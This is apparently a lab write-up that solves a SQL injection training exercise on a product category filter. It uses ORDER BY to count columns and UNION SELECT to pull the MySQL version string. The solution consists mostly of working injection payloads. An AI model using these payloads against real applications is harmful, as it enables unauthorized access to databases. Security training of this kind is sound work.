# Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

### Instructions

This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string. 

### Solution

We see on the application the instructions: 'Make the database retrieve the string: '8.0.42-0ubuntu0.20.04.1''

Using `ORDER BY` we can start enumerating column numbers.

```sql
/filter?category=Gifts' order by 3-- -
```

Gives us a 500 error.

We can assume there are two columns here.

This can be confirmed using `UNION SELECT` 

```sql
filter?category=Gifts' UNION SELECT 1,2-- -
```

Which loads the page without an error.

Next we can query the DB version with:

```sql
/filter?category=Gifts' UNION SELECT null,@@version-- -
```

Which returns the string: `8.0.42-0ubuntu0.20.04.1`, completing the lab.